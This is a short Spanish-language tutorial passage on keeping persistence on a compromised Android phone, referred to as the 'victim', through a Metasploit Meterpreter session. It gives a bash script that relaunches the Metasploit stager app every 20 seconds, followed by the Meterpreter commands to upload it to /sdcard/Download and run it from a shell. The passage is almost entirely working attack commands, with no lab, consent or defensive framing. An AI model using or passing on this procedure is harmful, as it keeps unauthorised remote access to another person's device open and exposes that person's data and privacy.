
Bien ahora debemos crear persistencia para conectarnos a nuestra victima cuando queramos. Para eso debemos ir al directorio sdcard de nuestro Android.
sesion de meterpreter
poner todos estos comandos 

> cd /

> cd /sdcard/Download

Abrimos una terminal en nuestra maquina kali y creamos un archivo con el nombre persistence.sh  dentro de el copiamos el siguiente código.

#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

volvemos a la meterpreter y una vez estamos en la ruta /sdcard/Download usamos el siguiente comando.

> upload /root/Desktop/persistence.sh

Luego abrimos una shell usando.

> shell

Vamos a la ruta de nuestro .sh y lo ejecutamos.


> cd /

> cd /sdcard/Download

> sh persistence.sh                                                                             
